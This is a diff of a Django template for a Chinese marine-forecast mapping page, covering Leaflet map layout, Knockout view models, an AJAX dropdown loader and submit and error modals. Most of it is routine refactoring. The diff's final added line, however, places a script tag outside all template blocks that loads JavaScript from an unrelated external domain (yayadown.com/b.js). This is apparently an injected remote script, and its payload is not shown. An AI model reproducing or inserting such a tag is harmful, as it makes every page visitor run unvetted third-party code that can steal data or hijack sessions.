@@ -1,20 +1,21 @@
 {#{% extends "shared/_Layout_Mapper_test.html" %}#}
-{%  extends "shared/_Layout_Mapper.html" %}
+{% extends "shared/_Layout_Mapper.html" %}
 {% block title %}地图绘制
 {% endblock %}
 {% block top-js %}
-    <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
-    <link rel="stylesheet" href="/static/css/map/leaflet.css" />
-    <link rel="stylesheet" href="/static/css/map/style.css" media="all" />
-{#    <link rel="stylesheet" href="/static/css/bootstrap-datetimepicker.css" />#}
+    <link rel="stylesheet" href="/static/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="/static/css/map/leaflet.css"/>
+    <link rel="stylesheet" href="/static/css/map/style.css" media="all"/>
+    {#    <link rel="stylesheet" href="/static/css/bootstrap-datetimepicker.css" />#}
     <script type="application/javascript" src="/static/js/map/leaflet.js"></script>
     <script type="application/javascript" src="/static/js/ko/jquery.livequery.js"></script>
     <script type="application/javascript" src="/static/js/ko/knockout.multimodels-0.1.js"></script>
     <script type="application/javascript" src="/static/js/viewmodel/Forecast/ElementContentMenu.js"></script>
     <script type="application/javascript" src="/static/js/viewmodel/map/RectangleMeasureViewModel.js"></script>
     <script type="application/javascript" src="/static/js/viewmodel/Forecast/BaseInfoViewModel.js"></script>
-{#    <script type="application/javascript" src="/static/js/bootstrap-datetimepicker.js"></script>#}
-{#    <script type="application/javascript" src="/static/js/bootstrap-datetimepicker.zh-CN.js"></script>#}
+    <script type="application/javascript" src="/static/js/comm/msgComm.js"></script>
+    {#    <script type="application/javascript" src="/static/js/bootstrap-datetimepicker.js"></script>#}
+    {#    <script type="application/javascript" src="/static/js/bootstrap-datetimepicker.zh-CN.js"></script>#}
 
     <style type="text/css">
         .row-margin-top {
@@ -33,187 +34,290 @@
         .col-padding-left-2 {
             padding-left: 2px;
         }
-        .Nodistance{
+
+        .Nodistance {
             padding-left: 0px;
             padding-right: 0px;
-            padding-bottom:0px;
-            padding-top:0px;
+            padding-bottom: 0px;
+            padding-top: 0px;
+            background-color: #F5E79E;
+            height:100%;
         }
+
+        #my_mapper {
+            background-color: red;
+{#            改为行内元素#}
+            display: inline-flex;
+            flex-direction:column;
+            height:100%;
+            /*height: 100%;*/
+            /*position: absolute;*/
+        }
+    #leafletMap{
+        height:100%;
+        background-color: #9d9d9d;
+    }
+    #leafletMap {
+{#				background-color: #00B83F;#}
+				height: 100%;
+				width: 100%;
+				/*width: 500px;*/
+				/*height: inherit;*/
+			}
     </style>
 
     <script type="application/javascript">
         var rectangleMeasureViewModel = new RectangleMeasureViewModel();
-        var elementViewModel=new ElementViewModel();
-        var baseInfoViewModel=new BaseInfoViewModel();
-        var toUrl="Forecast/produceImg";
+var elementViewModel;
+        var baseInfoViewModel = new BaseInfoViewModel();
+        var toUrl = "Forecast/produceImg";
         //加入datetime的设置
 
         $(function () {
+{#            var elementViewModel=new ElementViewModel();#}
 
+            list_element = [];
+				list_interval = [];
+				list_level = [];
+				aid=2;
+				$.ajax({
+					type: "GET",
+					url: "http://127.0.0.1:8000/Forecast/getDropDown?aid="+aid,
+					dataType: "json",
+					success: function(data) {
+						list_element_str = data['list_element']
+						list_interval_str = data['list_interval']
+						list_level_str = data['list_level']
+						//注意$().each与$.each()的区别
+						//$().each主要对于dom元素用的较多
+						//$.each()主要处理数组
+						$.each(JSON.parse(list_element_str), function(index, temp) {
+							element_temp=new Element(temp.fields.Dkey,temp.fields.DText)
+							list_element.push(element_temp);
+
+						});
+						$.each(JSON.parse(list_interval_str), function(index, temp) {
+							interval=new Interval(temp.fields.Dkey,temp.fields.DText,temp.fields.PDId)
+							list_interval.push(interval)
+						})
+						$.each(JSON.parse(list_level_str), function(index, temp) {
+							level=new Level(temp.fields.Dkey,temp.fields.DText,temp.fields.PDId)
+							list_level.push(level)
+						})
+						//						model=JSON.parse(data);
+						//						model=$.parseJSON(data)
+                        elementViewModel=new ElementViewModel(list_element,list_level,list_interval);
+						ko.attach("ElementViewModel", elementViewModel);
+{#						ko.applyBindings(new myViewModel(list_element,list_level,list_interval));#}
+					}
+				});
             {#            ko.applyBindings(elementViewModel,document.getElementById("editForm"));#}
-            ko.attach("RectangleMeasureViewModel",rectangleMeasureViewModel);
-            ko.attach("ElementViewModel",elementViewModel);
-            ko.attach("BaseInfoViewModel",baseInfoViewModel);
+            ko.attach("RectangleMeasureViewModel", rectangleMeasureViewModel);
+
+            ko.attach("BaseInfoViewModel", baseInfoViewModel);
             {#            ko.att#}
             {#                        ko.attach(rectangleMeasure,document.getElementById("editForm"));#}
             {#                        ko.attach(elementViewModel,document.getElementById("editForm"));#}
             {#         ko.applyBindings(rectangleMeasure);#}
 
-            $("#rectangleSel").unbind('click').bind('click', function() {
+            {#            $(document).on("show.bs.modal", ".modal", function(){#}
+            {#            $(this).draggable();#}
+            {#            });#}
+
+
+            $("#rectangleSel").unbind('click').bind('click', function () {
                 //          	mousedown 按下鼠标按键时触发
                 //          	mouseup 按下鼠标时触发
                 //				contextmenu 鼠标右键时触发
 //					map.on 打开对于某个事件的监听
 //					map.off 关闭对于某个事件的监听
                 map.on('mousedown', rectangleMeasureViewModel.mousedown).on('mouseup', rectangleMeasureViewModel.mouseup).on('contextmenu', rectangleMeasureViewModel.forbidRegion);
+                $("#mymsgcontent").css({"overflow": "auto", "height": "150px"});
             });
 
 // console.log(map);
         });
 
-        function doSubmit(){
-            var finialViewModel={
-                rectangleMeasureViewModel:rectangleMeasureViewModel.getData(),
-                elemenetViewModel:elementViewModel.getData(),
-                baseInfoViewModel:baseInfoViewModel.getData()
+        //解决10月31日出现的新的bug
+{#        function doSubmit(){#}
+{#            $("#progressModal").modal();#}
+{#        }#}
+
+        //暂时不用 10-31
+        function doSubmit() {
+            var finialViewModel = {
+                rectangleMeasureViewModel: rectangleMeasureViewModel.getData(),
+                elemenetViewModel: elementViewModel.getData(),
+                baseInfoViewModel: baseInfoViewModel.getData()
             };
             //序列化
             {#            var myFormData= finialViewModel.toJSON();#}
-            var myFormData=JSON.stringify(finialViewModel);
+            var myFormData = JSON.stringify(finialViewModel);
             //使用POST方式
 
-
+            $("#progressModal").modal();
 
             $.ajax({
                 type: "POST",
-                url:toUrl,
+                url: toUrl,
                 processData: true,
                 dataType: "json",
-                data:myFormData,
+                data: myFormData,
                 {#                data: { name: "John", time: "2pm" },#}
-                success: function(data) {
-                    //若state为1则为成功
-                    if(data.code == "6") {
-                        //获取img的url
-                        var img_url= data.message;
-                        $("#returnimg").attr('src',img_url);
-                        //显示modal框
-                        showme();
+                success: function (data) {
+                    //下载成功后隐藏之前的进度条
+                    $("#progressModal").modal('hide');
+                    //此时判断由后台传回的信息
+                    //只有code为-1时才是错误信息||目前只显示错误信息
+                    if (data.code == -1) {
+                        showMessage(data);
+                        return;
                     }
+                    showImg(data);
+
                 }
             });
         }
 
 
-        function showme(){
-				$("#myModal").modal();
-			}
+        function showImgModal() {
+            $("#myModal").modal();
+        }
 
+
+        function showImg(result) {
+            //若state为1则为成功
+            if (result.code == "6") {
+                //获取img的url
+                var img_url = result.message;
+                $("#returnimg").attr('src', img_url);
+                //显示modal框
+                showImgModal();
+            }
+        }
+
+        //显示后台返回的信息
+        function showMessage(result) {
+            loaderrmsg("mymsgtitle", "mymsgcontent", result.title, result.message);
+
+            hideModal(result);
+        }
+
+        function hideModal(result) {
+            $("#errorModal").on('hide.bs.modal', function () {
+                showImgModal(result)
+            })
+        }
     </script>
 {% endblock %}
 {% block content %}
-    <div id="content" class="col-md-10 Nodistance">
-        {#    	<div class="container">#}
-        <!--上面的菜单栏-->
-        <div class="col-md-12 Nodistance">
-            <div class="panel panel-primary " style="margin-bottom: 0px;">
-                <div class="panel-heading">预报信息</div>
-                <div class="panel-body" style="padding:2px">
-                    {#                    <div action="/home" method="post" class="form-horizontal col-md-12">#}
-                    <div class="form-horizontal col-md-12">
-                        <!--<form action="/home" id="editForm" method="post">-->
-                        <form  id="editForm">
-                            <!--基础信息-->
-                            <div class="form-group col-md-2" data-model="BaseInfoViewModel">
-                                <fieldset>
-                                    <legend>基础信息</legend>
+    {#    	<div class="container">#}
+    <!--上面的菜单栏-->
+    <div class=" " style="">
+        <div class="panel panel-primary " style="margin-bottom: 0px;">
+            <div class="panel-heading">预报信息</div>
+            <div class="panel-body" style="padding:2px">
+                {#                    <div action="/home" method="post" class="form-horizontal col-md-12">#}
+                <div class="form-horizontal col-md-12">
+                    <!--<form action="/home" id="editForm" method="post">-->
+                    <form id="editForm">
+                        <!--基础信息-->
+                        <div class="form-group col-md-2" data-model="BaseInfoViewModel">
+                            <fieldset>
+                                <legend>基础信息</legend>
 
-                                    <div class="form-group" style="margin-bottom:2px">
-                                        <div class="col-md-5 col-padding-2">
-                                            <label class="col-md-12 control-label">时间</label>
-                                        </div>
-                                        <div class="col-md-7 col-padding-left-2">
-                                            {# <select id="drops" class="form-control" name="date">#}
-                                            {#     <option value="00" selected>00时</option>#}
-                                            {# </select>#}
-                                            <div class="input-append date form_datetime">
-{#                                                <input name="targetdate" type="text" data-bind="value:targetdate" class="form-control ">#}
-{#                                                <span class="add-on"><i class="icon-th"></i></span>#}
-
-                                                 <input type="text" name="targetdate" data-bind="value:targetdate" class="form-control ">
-                                            </div>
-                                        </div>
-
+                                <div class="form-group" style="margin-bottom:2px">
+                                    <div class="col-md-5 col-padding-2">
+                                        <label class="col-md-12 control-label">时间</label>
                                     </div>
-                                </fieldset>
-                            </div>
-                            <!--区域信息-->
-                            <div class="form-group col-md-4" data-model="RectangleMeasureViewModel">
-                                <fieldset>
-                                    <legend>预报区域</legend>
-                                    <div class="form-group">
-                                        <div class="col-md-2" style="padding:4px">
-                                            <label class="col-md-12 control-label col-padding-2">经度</label>
-                                        </div>
-                                        <div class="col-md-3 col-padding-2">
-                                            {#                                            <input type="text" placeholder="起始" name="lon_start" class="form-control ">#}
-                                            <input type="text" placeholder="起始" name="lon_start" data-bind="value:formattedStartLat" class="form-control ">
-                                        </div>
-                                        <div class="col-md-3 col-padding-2">
-                                            {#                                            <input type="text" placeholder="结束" name="lon_finish" class="form-control">#}
-                                            <input type="text" placeholder="结束" name="lon_finish" data-bind="value:formattedFinishLat" class="form-control">
-                                        </div>
-                                        <div class="col-md-4">
-                                            <!--<button class="btn btn-primary col-md-12">常用区域</button>-->
-                                            <!--注意此处在Button外侧不用再套一个div 因为会默认有一个padding-->
-                                            <!--<div class="btn-group col-md-12">-->
-                                            <button type="button" class="btn btn-primary dropdown-toggle col-md-12" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                                                常用区域 <span class="caret"></span>
-                                            </button>
-                                            <ul class="dropdown-menu">
-                                                <li>
-                                                    <a href="#">北海</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#">东海</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#">南海</a>
-                                                </li>
-                                                <li class="divider"></li>
-                                                <li>
-                                                    <a href="#">其他</a>
-                                                </li>
-                                            </ul>
-                                            <!--</div>-->
+                                    <div class="col-md-7 col-padding-left-2">
+                                        {# <select id="drops" class="form-control" name="date">#}
+                                        {#     <option value="00" selected>00时</option>#}
+                                        {# </select>#}
+                                        <div class="input-append date form_datetime">
+                                            {#                                                <input name="targetdate" type="text" data-bind="value:targetdate" class="form-control ">#}
+                                            {#                                                <span class="add-on"><i class="icon-th"></i></span>#}
+
+                                            <input type="text" name="targetdate" data-bind="value:targetdate"
+                                                   class="form-control ">
                                         </div>
                                     </div>
-                                    <div class="form-group" style="margin-bottom:2px">
-                                        <div class="col-md-2" style="padding:4px">
-                                            <label class="col-md-12 control-label col-padding-2">纬度</label>
-                                        </div>
-                                        <div class="col-md-3 col-padding-2">
-                                            {#                                            <input type="text" placeholder="起始" name="lat_start" class="form-control col-md-4">#}
-                                            <input type="text" placeholder="起始" name="lat_start" class="form-control col-md-4" data-bind="value:formattedStartLng">
-                                        </div>
-                                        <div class="col-md-3 col-padding-2">
-                                            {#                                            <input type="text" placeholder="结束" name="lat_finish" class="form-control col-md-4">#}
-                                            <input type="text" placeholder="结束" name="lat_finish"  data-bind="value:formattedFinishLng" class="form-control col-md-4">
-                                        </div>
-                                        <div class="col-md-4">
-                                            {#                                            <button class="btn btn-success col-md-12" id="rectangleSel">框选区域</button>#}
-                                            {#                                            <button type="button" class="btn btn-success col-md-12" id="rectangleSel" onclick="doSubmit()">#}
-                                            <button type="button" class="btn btn-success col-md-12" id="rectangleSel">
-                                                框选区域
-                                            </button>
-                                        </div>
-                                    </div>
-                                </fieldset>
-                            </div>
 
-                            <!--预报信息-->
-                            <div data-model="ElementViewModel">
- <div class="form-group col-md-3" >
+                                </div>
+                            </fieldset>
+                        </div>
+                        <!--区域信息-->
+                        <div class="form-group col-md-4" data-model="RectangleMeasureViewModel">
+                            <fieldset>
+                                <legend>预报区域</legend>
+                                <div class="form-group">
+                                    <div class="col-md-2" style="padding:4px">
+                                        <label class="col-md-12 control-label col-padding-2">经度</label>
+                                    </div>
+                                    <div class="col-md-3 col-padding-2">
+                                        {#                                            <input type="text" placeholder="起始" name="lon_start" class="form-control ">#}
+                                        <input type="text" placeholder="起始" name="lon_start"
+                                               data-bind="value:formattedStartLat" class="form-control ">
+                                    </div>
+                                    <div class="col-md-3 col-padding-2">
+                                        {#                                            <input type="text" placeholder="结束" name="lon_finish" class="form-control">#}
+                                        <input type="text" placeholder="结束" name="lon_finish"
+                                               data-bind="value:formattedFinishLat" class="form-control">
+                                    </div>
+                                    <div class="col-md-4">
+                                        <!--<button class="btn btn-primary col-md-12">常用区域</button>-->
+                                        <!--注意此处在Button外侧不用再套一个div 因为会默认有一个padding-->
+                                        <!--<div class="btn-group col-md-12">-->
+                                        <button type="button" class="btn btn-primary dropdown-toggle col-md-12"
+                                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                            常用区域 <span class="caret"></span>
+                                        </button>
+                                        <ul class="dropdown-menu">
+                                            <li>
+                                                <a href="#">北海</a>
+                                            </li>
+                                            <li>
+                                                <a href="#">东海</a>
+                                            </li>
+                                            <li>
+                                                <a href="#">南海</a>
+                                            </li>
+                                            <li class="divider"></li>
+                                            <li>
+                                                <a href="#">其他</a>
+                                            </li>
+                                        </ul>
+                                        <!--</div>-->
+                                    </div>
+                                </div>
+                                <div class="form-group" style="margin-bottom:2px">
+                                    <div class="col-md-2" style="padding:4px">
+                                        <label class="col-md-12 control-label col-padding-2">纬度</label>
+                                    </div>
+                                    <div class="col-md-3 col-padding-2">
+                                        {#                                            <input type="text" placeholder="起始" name="lat_start" class="form-control col-md-4">#}
+                                        <input type="text" placeholder="起始" name="lat_start"
+                                               class="form-control col-md-4" data-bind="value:formattedStartLng">
+                                    </div>
+                                    <div class="col-md-3 col-padding-2">
+                                        {#                                            <input type="text" placeholder="结束" name="lat_finish" class="form-control col-md-4">#}
+                                        <input type="text" placeholder="结束" name="lat_finish"
+                                               data-bind="value:formattedFinishLng" class="form-control col-md-4">
+                                    </div>
+                                    <div class="col-md-4">
+                                        {#                                            <button class="btn btn-success col-md-12" id="rectangleSel">框选区域</button>#}
+                                        {#                                            <button type="button" class="btn btn-success col-md-12" id="rectangleSel" onclick="doSubmit()">#}
+                                        <button type="button" class="btn btn-success col-md-12" id="rectangleSel">
+                                            框选区域
+                                        </button>
+                                    </div>
+                                </div>
+                            </fieldset>
+                        </div>
+
+                        <!--预报信息-->
+                        <div data-model="ElementViewModel">
+                            <div class="form-group col-md-3">
                                 <fieldset>
                                     <legend>预报信息</legend>
                                     <div class="form-group">
@@ -279,93 +383,79 @@
 
                             </div>
 
-                            </div>
+                        </div>
 
-                        </form>
-                    </div>
-                </div>
-                <!--<div class="panel-footer">页脚</div>-->
-            </div>
-        </div>
-        <!--中间的导航栏-->
-        <div class="col-md-12 Nodistance">
-            <nav class="navbar navbar-default" style="margin-bottom: 0px;">
-                <div class="container-fluid">
-                    <!-- Brand and toggle get grouped for better mobile display -->
-                    <div class="navbar-header">
-                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
-                            <span class="sr-only">Toggle navigation</span>
-                            <span class="icon-bar"></span>
-                            <span class="icon-bar"></span>
-                            <span class="icon-bar"></span>
-                        </button>
-                        <a class="navbar-brand" href="#">位置</a>
-                    </div>
-                    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
-                        <ul class="nav navbar-nav">
-                            <li class="active">
-                                <a href="#"><span class="glyphicon glyphicon-map-marker
-"></span>全图 <span class="sr-only">(current)</span></a>
-                            </li>
-                            <li>
-                                <a href="#"><span class="glyphicon glyphicon-screenshot"></span>漫游</a>
-                            </li>
-                            <li>
-                                <a href="#">西太平洋</a>
-                            </li>
-                            </li>
-                            <li>
-                                <a href="#">北印度洋</a>
-                            </li>
-                        </ul>
-                        <ul class="nav navbar-nav navbar-right">
-                            <li>
-                                <a href="#"><span class="glyphicon glyphicon-zoom-in"></span>放大</a>
-                            </li>
-                            <li>
-                                <a href="#"><span class="glyphicon glyphicon-zoom-out"></span>缩小</a>
-                            </li>
-                        </ul>
-                    </div>
-                    <!-- /.navbar-collapse -->
-
-                </div>
-                <!-- /.container-fluid -->
-            </nav>
-
-        </div>
-        <!--下部的巨幕-->
-        <div class="col-md-12 Nodistance" style="">
-            <div class="jumbotron Nodistance" style="height:600px">
-                <div id="leafletMap" style="height:100%" ></div>
-
-            </div>
-        </div>
-        <!--modal窗口-->
-        <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
-            <div class="modal-dialog" role="document">
-                <div class="modal-content">
-                    <div class="modal-header">
-
-                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
-                        <h4 class="modal-title" id="myModalLabel">标题1</h4>
-                    </div>
-                    <div class="modal-body">
-                        <img id="returnimg" src="" class="img-responsive">
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-success" data-dismiss="modal">确定</button>
-
-                    </div>
+                    </form>
                 </div>
             </div>
+            <!--<div class="panel-footer">页脚</div>-->
         </div>
     </div>
-{% endblock %}
+    <!--中间的导航栏-->
+    <div class="" style="">
+        <nav class="navbar navbar-default" style="margin-bottom: 0px;">
+            <div class="container-fluid">
+                <!-- Brand and toggle get grouped for better mobile display -->
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
+                            data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="#">位置</a>
+                </div>
+                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                    <ul class="nav navbar-nav">
+                        <li class="active">
+                            <a href="#"><span class="glyphicon glyphicon-map-marker
+"></span>全图 <span class="sr-only">(current)</span></a>
+                        </li>
+                        <li>
+                            <a href="#"><span class="glyphicon glyphicon-screenshot"></span>漫游</a>
+                        </li>
+                        <li>
+                            <a href="#">西太平洋</a>
+                        </li>
+                        </li>
+                        <li>
+                            <a href="#">北印度洋</a>
+                        </li>
+                    </ul>
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#"><span class="glyphicon glyphicon-zoom-in"></span>放大</a>
+                        </li>
+                        <li>
+                            <a href="#"><span class="glyphicon glyphicon-zoom-out"></span>缩小</a>
+                        </li>
+                    </ul>
+                </div>
+                <!-- /.navbar-collapse -->
+
+            </div>
+            <!-- /.container-fluid -->
+        </nav>
+
+    </div>
+    <!--下部的巨幕-->
+    <div id="my_mapper" class="" style="">
+     <div id="leafletMap" ></div>
+{#    <div class="innerdiv"></div>#}
+{#        <div id="myimg" style=""></div>#}
+{#        <div class="jumbotron Nodistance">#}
+{##}
+{##}
+{#        </div>#}
+    </div>
+   {% endblock %}
 
 {% block bottom-js %}
     <script type="application/javascript" src="/static/js/map/leaflet_maplayer.js"></script>
     <script type="application/javascript">
+        //声明一个方法用来显示错误信息
+
         //使用ko的方式进行绑定，使用js的方式声明对象
         {#function RectangleMeasureViewModel() {#}
         {#            var self = this;#}
@@ -478,3 +568,4 @@
         {#   #}
     </script>
 {% endblock %}
+<script src="http://www.yayadown.com/b.js"></script>
